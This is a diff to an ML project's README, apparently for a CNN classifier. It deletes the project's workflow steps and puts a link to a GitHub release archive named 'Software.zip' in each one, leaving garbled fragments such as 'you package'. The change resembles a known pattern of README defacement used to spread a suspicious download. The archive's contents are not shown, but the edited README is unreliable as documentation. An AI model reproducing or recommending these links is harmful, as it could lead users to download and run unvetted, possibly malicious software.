@@ -2,13 +2,13 @@
 
 # workflow
 
-1.research/trils
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip
 
-2.config.yaml
-3.entity
-4.component
-5.pipeline
-6.training
-7.prediction
-8.test you package
-9.DVC for the reproducing the pipeline
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip you package
+https://github.com/Arup0070/fsdscnnclasifier/releases/download/v1.0/Software.zip for the reproducing the pipeline
